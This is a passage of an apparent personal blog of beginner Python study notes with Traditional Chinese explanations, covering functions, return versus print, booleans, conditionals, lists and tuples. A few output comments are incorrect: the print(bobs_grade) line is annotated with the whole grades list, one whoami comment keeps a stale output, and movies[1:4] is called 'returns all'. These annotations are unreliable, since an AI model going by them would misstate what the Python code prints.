<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Built-in method example</span></span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">length = <span class="built_in">len</span>(numbers) <span class="comment">#計算列表的長度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Length:&quot;</span>, length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># User-defined method example</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):<span class="comment">#使用者定義的方法greet()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name)<span class="comment">#接受一個參數名稱並列印一條問候訊息</span></span><br><span class="line"><span class="comment">#使用參數“Alice”調用它以將“Hello, Alice”列印到控制台。</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&quot;Alice&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以有回傳值、執行操作、接受參數等等</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">quote = <span class="string">&quot;all is fair in love and war&quot;</span></span><br><span class="line"><span class="built_in">print</span>(quote)<span class="comment">#all is fair in love and war</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#uppercase</span></span><br><span class="line"><span class="built_in">print</span>(quote.upper())<span class="comment">#ALL IS FAIR IN LOVE AND WAR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#lowercase</span></span><br><span class="line"><span class="built_in">print</span>(quote.lower())<span class="comment">#all is fair in love and war</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#title case</span></span><br><span class="line"><span class="built_in">print</span>(quote.title())<span class="comment">#All Is Fair In Love And War</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#count characters</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(quote))<span class="comment">#27</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#string</span></span><br><span class="line">name = <span class="string">&quot;Heath&quot;</span></span><br><span class="line"><span class="comment">#int</span></span><br><span class="line">age =<span class="number">33</span></span><br><span class="line"><span class="comment">#float - has a decimal</span></span><br><span class="line">gpa = <span class="number">3.7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(age))<span class="comment">#33</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="number">30.1</span>))<span class="comment">#30</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#will it round? No</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="number">30.9</span>))<span class="comment">#30</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&quot;my name is &quot; + name + &quot; and I am &quot; + age + &quot; years old&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Traceback (most recent call last):</span></span><br><span class="line"><span class="string">      File &quot;/home/kali/Desktop/python/variable.py&quot;, line 29, in &lt;module&gt;</span></span><br><span class="line"><span class="string">    print(&quot;my name is &quot; + name + &quot; and I am &quot; + age + &quot; years old&quot;)</span></span><br><span class="line"><span class="string">          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~</span></span><br><span class="line"><span class="string">TypeError: can only concatenate str (not &quot;int&quot;) to str</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;my name is &quot;</span> + name + <span class="string">&quot; and I am &quot;</span> + <span class="built_in">str</span>(age) + <span class="string">&quot; years old&quot;</span>)<span class="comment">#my name is Heath and I am 33 years old</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#variable can change </span></span><br><span class="line">age +=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(age)<span class="comment">#34</span></span><br><span class="line"></span><br><span class="line">birthday = <span class="number">1</span></span><br><span class="line">age += birthday</span><br><span class="line"><span class="built_in">print</span>(age)<span class="comment">#35</span></span><br></pre></td></tr></table></figure>
<h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><ul>
<li>執行特定任務的可重複使用程式碼區塊</li>
<li>程式碼組織為邏輯和模組化單元</li>
<li>更具可讀性、可維護性和可重複使用性</li>
<li><p>Function Definition</p>
<ul>
<li>函數是使用 <strong>def</strong>  關鍵字定義</li>
<li>跟著函數名稱、括號和冒號</li>
<li><p>具有參數（可選）和傳回語句（可選）來傳回結果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, World!&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Function Call</p>
<ul>
<li><p>要執行一個函數，您需要透過其名稱呼叫它，後面跟著括號</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">greet()</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Function Parameters</p>
<ul>
<li>函數可以接受參數</li>
<li>呼叫函數時保存傳遞給函數的值的變數</li>
<li><p>參數可讓您根據您提供的值自訂函數的行為</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>)<span class="comment">#greet() 函數接受名為 name 的參數</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&quot;Alice&quot;</span>)<span class="comment">#使用參數（例如“Alice”）呼叫函數時,值將指派給函數體內的名稱參數</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Return Statement</p>
<ul>
<li>函數也可以使用 return 語句傳回值</li>
<li><p>返回值可以分配給變數或直接在表達式中使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_numbers</span>(<span class="params">a, b</span>):<span class="comment">#提供了一種封裝可重複使用程式碼並改進程式結構的方法</span></span><br><span class="line"><span class="comment">#接受輸入、執行計算並產生輸出</span></span><br><span class="line">    <span class="keyword">return</span> a + b <span class="comment">#返回值指派給結果變數並列印</span></span><br><span class="line"></span><br><span class="line">result = add_numbers(<span class="number">3</span>, <span class="number">4</span>)<span class="comment">#採用兩個參數（a 和 b）並傳回它們的總和</span></span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># Output: 7</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>function 中使用return跟print的時機</p>
<ul>
<li><p>使用return</p>
<ul>
<li>當函數需要返回一個值給調用者時</li>
<li><p>調用者接收到函數返回值並將其儲存到變量中或做其他處理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a,b</span>):</span><br><span class="line">	**<span class="keyword">return</span> a+b**</span><br><span class="line"></span><br><span class="line">testfun = **test(<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># 須返回值**</span></span><br><span class="line"><span class="built_in">print</span>(testfun)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>使用print</p>
<ul>
<li>向控制台輸出某些訊息時</li>
<li><p>不返回任何值給調用者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">valu</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;HI&#x27;</span>+valu)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;404&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>如果函數的目的是為了得到一個結果，那麼使用 return 會比較合適</p>
</li>
<li>如果函數的目的是為了輸出資訊而不是傳回一個值，那麼直接使用 print 會比較合適。</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#this is a function without parameter</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami</span>():</span><br><span class="line">    name = <span class="string">&quot;heath&quot;</span> <span class="comment"># local variable</span></span><br><span class="line">    age = <span class="number">30</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &quot;</span> + name + <span class="string">&quot; and I am &quot;</span> + <span class="built_in">str</span>(age) + <span class="string">&quot; years old&quot;</span>)<span class="comment">#my name is Heath and I am 33 years old</span></span><br><span class="line">    <span class="comment">#my name is heath and I am 30 years old</span></span><br><span class="line"></span><br><span class="line">whoami()</span><br><span class="line"><span class="comment">#print(age)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(age)</span></span><br><span class="line"><span class="string">          ^^^</span></span><br><span class="line"><span class="string">NameError: name &#x27;age&#x27; is not defined</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addonehundured</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(num+<span class="number">100</span>)<span class="comment">#200</span></span><br><span class="line"></span><br><span class="line">addonehundured(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="built_in">print</span>(x+y)<span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mutiply</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x*y</span><br><span class="line"></span><br><span class="line">mutiply(<span class="number">7</span>,<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(mutiply(<span class="number">7</span>,<span class="number">7</span>))<span class="comment">#49</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seqroot</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(x ** <span class="number">.5</span>)<span class="comment">#8.0</span></span><br><span class="line"></span><br><span class="line">seqroot(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#new line</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nl</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">nl()</span><br></pre></td></tr></table></figure>
<h3 id="Boolean-Expressions-and-Relational-Operators"><a href="#Boolean-Expressions-and-Relational-Operators" class="headerlink" title="Boolean Expressions and Relational Operators"></a><strong>Boolean Expressions and Relational Operators</strong></h3><p><img src="img/Py_Untitled.png" alt="Untitled"></p>
<ul>
<li>boolean expressions<ul>
<li>計算結果為 True 或 False</li>
<li>條件語句和邏輯運算</li>
<li>根據某些條件的真假做出決策</li>
<li>邏輯運算子組合關係表達式</li>
<li>Logical AND (<code>and</code>)<ul>
<li>如果兩個操作數都為 True，則傳回 True。</li>
</ul>
</li>
<li>Logical OR (<code>or</code>)<ul>
<li>如果至少有一個運算元為 True，則傳回 True。</li>
</ul>
</li>
<li>Logical NOT (<code>not</code>)<ul>
<li>對操作數的值取反。</li>
</ul>
</li>
</ul>
</li>
<li>Relational operators<ul>
<li>比較值和建立boolean expressions</li>
<li>Equality (<code>==</code>)<ul>
<li>檢查兩個值是否相等</li>
</ul>
</li>
<li>Inequality (<code>!=</code>)<ul>
<li>檢查兩個值是否不相等</li>
</ul>
</li>
<li>Greater than (<code>&gt;</code>)<ul>
<li>檢查左側值是否大於右側值</li>
</ul>
</li>
<li>Less than (<code>&lt;</code>)<ul>
<li>檢查左側值是否小於右側值</li>
</ul>
</li>
<li>Greater than or equal to (<code>&gt;=</code>)<ul>
<li>檢查左側值是否大於或等於右側值</li>
</ul>
</li>
<li>Less than or equal to (<code>&lt;=</code>)<ul>
<li>檢查左側值是否小於或等於右側值</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#兩個變數 x 和 y</span></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line">y = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Relational operators</span></span><br><span class="line"><span class="comment"># 比較它們的值並建立布林表達式</span></span><br><span class="line"><span class="built_in">print</span>(x == y)   <span class="comment"># Output: False</span></span><br><span class="line"><span class="built_in">print</span>(x &lt; y)    <span class="comment"># Output: True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Boolean expressions</span></span><br><span class="line"><span class="comment"># 使用邏輯運算子（and、or、not）來組合關係表達式並評估整體真值</span></span><br><span class="line"><span class="built_in">print</span>(x &lt; y <span class="keyword">and</span> y &gt; <span class="number">0</span>)    <span class="comment"># Output: True</span></span><br><span class="line"><span class="built_in">print</span>(x &lt; y <span class="keyword">or</span> y &lt; <span class="number">0</span>)     <span class="comment"># Output: True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> (x == y))       <span class="comment"># Output: True</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Boolean expressions (True or False)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Boolean expressions:&quot;</span>)</span><br><span class="line"></span><br><span class="line">bool1 = <span class="literal">True</span></span><br><span class="line">bool2 = <span class="number">3</span>*<span class="number">3</span> == <span class="number">9</span></span><br><span class="line">bool3 = <span class="literal">False</span></span><br><span class="line">bool4 = <span class="number">3</span>*<span class="number">3</span> != <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bool1,bool2,bool3,bool4)<span class="comment">#True True False False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(bool1))<span class="comment">#&lt;class &#x27;bool&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">bool5 = <span class="string">&quot;True&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(bool5)) <span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Relational and Boolean operators</span></span><br><span class="line">greater_than = <span class="number">7</span> &gt; <span class="number">5</span></span><br><span class="line">less_than = <span class="number">5</span> &lt; <span class="number">7</span></span><br><span class="line">greater_than_equal_to = <span class="number">7</span> &gt;=<span class="number">7</span></span><br><span class="line">less_than_equal_to = <span class="number">7</span> &lt;= <span class="number">7</span></span><br><span class="line"></span><br><span class="line">test_and = <span class="literal">True</span> <span class="keyword">and</span> <span class="literal">True</span> <span class="comment">#True</span></span><br><span class="line">test_and2 = <span class="literal">True</span> <span class="keyword">and</span> <span class="literal">False</span> <span class="comment">#False</span></span><br><span class="line">test_or = <span class="literal">True</span> <span class="keyword">or</span> <span class="literal">True</span> <span class="comment">#True</span></span><br><span class="line">test_or2 = <span class="literal">True</span> <span class="keyword">or</span> <span class="literal">False</span> <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line">test_not = <span class="keyword">not</span> <span class="literal">True</span> <span class="comment">#False</span></span><br></pre></td></tr></table></figure>
<h3 id="Conditional-Statements"><a href="#Conditional-Statements" class="headerlink" title="Conditional Statements"></a><strong>Conditional Statements</strong></h3><ul>
<li>根據特定條件執行不同的操作</li>
<li>允許您在滿足某些條件時透過執行特定的程式碼區塊</li>
<li><p>if Statement:</p>
<ul>
<li><p>if 語句是最基本的條件語句。如果給定條件為真，它會執行一段程式碼。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    <span class="comment"># code to be executed if the condition is true</span></span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is positive&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果條件 x &gt; 0 為 true，則會執行 if block (print(“x is Positive”)) 內的程式碼</p>
</li>
</ul>
</li>
<li><p>if-else Statement:</p>
<ul>
<li>指定兩個不同的程式碼區塊</li>
<li><p>一個在條件為 true 時執行，另一個在條件為 false 時執行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    <span class="comment"># code to be executed if the condition is true</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># code to be executed if the condition is false</span></span><br><span class="line"></span><br><span class="line">-------</span><br><span class="line"></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is positive&quot;</span>)<span class="comment">#如果 x 大於 0，則會執行第一個區塊 (print(&quot;x is Positive&quot;))</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is not positive&quot;</span>)<span class="comment">#否則，將執行第二個區塊（print（“x is not positive”)）</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>if-elif-else Statement:</p>
<ul>
<li>if-elif-else 語句可讓您<strong>檢查多個條件</strong>並根據這些條件執行不同的程式碼區塊</li>
<li><p>提供了兩個以上的分支選項</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition1:</span><br><span class="line">    <span class="comment"># code to be executed if condition1 is true</span></span><br><span class="line"><span class="keyword">elif</span> condition2:</span><br><span class="line">    <span class="comment"># code to be executed if condition1 is false and condition2 is true</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># code to be executed if all conditions are false</span></span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is positive&quot;</span>)<span class="comment">#如果 x 大於 0，則將執行第一個區塊</span></span><br><span class="line"><span class="keyword">elif</span> x &lt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is negative&quot;</span>)<span class="comment">#如果小於0，則執行第二個區塊</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is zero&quot;</span>)<span class="comment">#否則，如果沒有一個條件為真，則會執行第三個區塊。</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Conditional Statements</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drink</span>(<span class="params">money</span>):</span><br><span class="line">	<span class="keyword">if</span> money &gt;= <span class="number">2</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;You&#x27;ve got yourself a drink!&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;No drink for you!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(drink(<span class="number">3</span>))<span class="comment">#You&#x27;ve got yourself a drink!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(drink(<span class="number">1</span>))<span class="comment">#No drink for you!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alcohol</span>(<span class="params">age,money</span>):</span><br><span class="line">	<span class="keyword">if</span>(age &gt;= <span class="number">21</span>) <span class="keyword">and</span> (money &gt;= <span class="number">5</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;We&#x27;re getting a drink!&quot;</span></span><br><span class="line">	<span class="keyword">elif</span> (age &gt;= <span class="number">21</span>) <span class="keyword">and</span> (money &lt; <span class="number">5</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Come back with more money.&quot;</span></span><br><span class="line">	<span class="keyword">elif</span> (age &lt; <span class="number">21</span>) <span class="keyword">and</span> (money &gt;= <span class="number">5</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Nice try, kid!&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;You&#x27;re too poor and too young!&quot;</span></span><br><span class="line">		</span><br><span class="line"><span class="built_in">print</span>(alcohol(<span class="number">21</span>,<span class="number">5</span>))<span class="comment">#We&#x27;re getting a drink!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(alcohol(<span class="number">21</span>,<span class="number">4</span>))<span class="comment">#Come back with more money.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(alcohol(<span class="number">20</span>,<span class="number">5</span>))<span class="comment">#Nice try, kid!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(alcohol(<span class="number">20</span>,<span class="number">4</span>))<span class="comment">#You&#x27;re too poor and too young!</span></span><br></pre></td></tr></table></figure>
<h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><ul>
<li>通用且可變的資料結構</li>
<li>可以保存項目的集合</li>
<li>允許您在單一變數中儲存不同資料類型的多個值</li>
<li>儲存和操作項目集合</li>
<li><p>List Creation</p>
<ul>
<li><p>將逗號分隔的值括在方括號內</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>]</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>List Access</p>
<ul>
<li>可以使用索引存取清單中的各個元素</li>
<li><p>第一個元素的索引從 0 開始，一直到列表長度減一</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(fruits[<span class="number">0</span>])    <span class="comment"># Output: &quot;apple&quot;</span></span><br><span class="line"><span class="built_in">print</span>(fruits[<span class="number">2</span>])    <span class="comment"># Output: &quot;orange&quot;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>List Modification</p>
<ul>
<li>清單是可變的，這意味著您可以修改它們的元素</li>
<li><p>新值指派給清單中的特定位置或使用方法來修改清單本身</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits[<span class="number">1</span>] = <span class="string">&quot;grape&quot;</span>     <span class="comment"># Modifying an element</span></span><br><span class="line">fruits.append(<span class="string">&quot;kiwi&quot;</span>)   <span class="comment"># Adding an element to the end</span></span><br><span class="line">fruits.remove(<span class="string">&quot;apple&quot;</span>)  <span class="comment"># Removing an element</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>List Operations</p>
<ul>
<li>對清單執行的各種操作</li>
<li>Concatenation<ul>
<li>使用 + 運算子連接兩個或多個清單</li>
</ul>
</li>
<li>Length<ul>
<li>len() 函數傳回列表中元素的數量</li>
</ul>
</li>
<li>Slicing<ul>
<li>使用切片從清單中提取子清單</li>
</ul>
</li>
<li><p>Iteration</p>
<ul>
<li>使用循環來迭代列表的元素</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;orange&quot;</span>]</span><br><span class="line">fruits2 = [<span class="string">&quot;grape&quot;</span>, <span class="string">&quot;kiwi&quot;</span>]</span><br><span class="line"></span><br><span class="line">combined = fruits + fruits2</span><br><span class="line"><span class="built_in">print</span>(combined)         <span class="comment"># Output: [&quot;apple&quot;, &quot;banana&quot;, &quot;orange&quot;, &quot;grape&quot;, &quot;kiwi&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(fruits))      <span class="comment"># Output: 3</span></span><br><span class="line"></span><br><span class="line">sublist = fruits[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(sublist)          <span class="comment"># Output: [&quot;banana&quot;, &quot;orange&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fruit <span class="keyword">in</span> fruits:</span><br><span class="line">    <span class="built_in">print</span>(fruit)        <span class="comment"># Output: &quot;apple&quot;, &quot;banana&quot;, &quot;orange&quot;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Lists - Have brackets []</span></span><br><span class="line">movies = [<span class="string">&quot;When Harry Met Sally&quot;</span>, <span class="string">&quot;The Hangover&quot;</span>, <span class="string">&quot;The Perks of Being a Wallflower&quot;</span>, <span class="string">&quot;The Exorcist&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#returns the second item in the list - index / indices</span></span><br><span class="line"><span class="built_in">print</span>(movies[<span class="number">1</span>]) <span class="comment">#The Hangover</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#returns the first item in the list</span></span><br><span class="line"><span class="built_in">print</span>(movies[<span class="number">0</span>]) <span class="comment">#When Harry Met Sally</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#returns the first number given until right before last number given</span></span><br><span class="line"><span class="built_in">print</span>(movies[<span class="number">1</span>:<span class="number">3</span>]) <span class="comment">#[&#x27;The Hangover&#x27;, &#x27;The Perks of Being a Wallflower&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#returns all </span></span><br><span class="line"><span class="built_in">print</span>(movies[<span class="number">1</span>:<span class="number">4</span>]) <span class="comment">#[&#x27;The Hangover&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#returns everything from number to end of list</span></span><br><span class="line"><span class="built_in">print</span>(movies[<span class="number">1</span>:]) <span class="comment">#[&#x27;The Hangover&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#everything before 1</span></span><br><span class="line"><span class="built_in">print</span>(movies[:<span class="number">1</span>]) <span class="comment">#[&#x27;When Harry Met Sally&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(movies[:<span class="number">2</span>]) <span class="comment">#[&#x27;When Harry Met Sally&#x27;, &#x27;The Hangover&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#grabs last item</span></span><br><span class="line"><span class="built_in">print</span>(movies[-<span class="number">1</span>]) <span class="comment">#The Exorcist</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#counts items in list</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(movies)) <span class="comment">#4</span></span><br><span class="line">movies.append(<span class="string">&quot;JAWS&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#appends to end of list</span></span><br><span class="line"><span class="built_in">print</span>(movies) <span class="comment">#[&#x27;When Harry Met Sally&#x27;, &#x27;The Hangover&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;, &#x27;JAWS&#x27;]</span></span><br><span class="line"></span><br><span class="line">movies.insert(<span class="number">2</span>, <span class="string">&quot;Hustle&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(movies) <span class="comment">#[&#x27;When Harry Met Sally&#x27;, &#x27;The Hangover&#x27;, &#x27;Hustle&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;, &#x27;JAWS&#x27;]</span></span><br><span class="line"></span><br><span class="line">movies.pop() <span class="comment">#removes last item</span></span><br><span class="line"><span class="built_in">print</span>(movies) <span class="comment">#[&#x27;When Harry Met Sally&#x27;, &#x27;The Hangover&#x27;, &#x27;Hustle&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;]</span></span><br><span class="line"></span><br><span class="line">movies.pop(<span class="number">0</span>) <span class="comment">#removes first item </span></span><br><span class="line"><span class="built_in">print</span>(movies) <span class="comment">#[&#x27;The Hangover&#x27;, &#x27;Hustle&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;]</span></span><br><span class="line"></span><br><span class="line">amber_movies = [<span class="string">&#x27;Just Go With It&#x27;</span>, <span class="string">&#x27;50 First Dates&#x27;</span>]</span><br><span class="line">our_favorite_movies = movies + amber_movies</span><br><span class="line"><span class="built_in">print</span>(our_favorite_movies)<span class="comment">#[&#x27;The Hangover&#x27;, &#x27;Hustle&#x27;, &#x27;The Perks of Being a Wallflower&#x27;, &#x27;The Exorcist&#x27;, &#x27;Just Go With It&#x27;, &#x27;50 First Dates&#x27;]</span></span><br><span class="line"></span><br><span class="line">grades = [[<span class="string">&quot;Bob&quot;</span>, <span class="number">82</span>], [<span class="string">&quot;Alice&quot;</span>, <span class="number">90</span>], [<span class="string">&quot;Jeff&quot;</span>, <span class="number">73</span>]]</span><br><span class="line">bobs_grade = grades[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(bobs_grade)<span class="comment">#82</span></span><br><span class="line">grades[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">83</span></span><br><span class="line"><span class="built_in">print</span>(bobs_grade)<span class="comment">#[[&#x27;Bob&#x27;, 83], [&#x27;Alice&#x27;, 90], [&#x27;Jeff&#x27;, 73]]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Tuples"><a href="#Tuples" class="headerlink" title="Tuples"></a>Tuples</h3><ul>
<li>元組是元素的有序集合，類似於列表</li>
<li>元組是不可變的，元素一旦創建就無法修改</li>
<li>建立元組，請將逗號分隔的值括在括號 ( ) 內</li>
</ul>
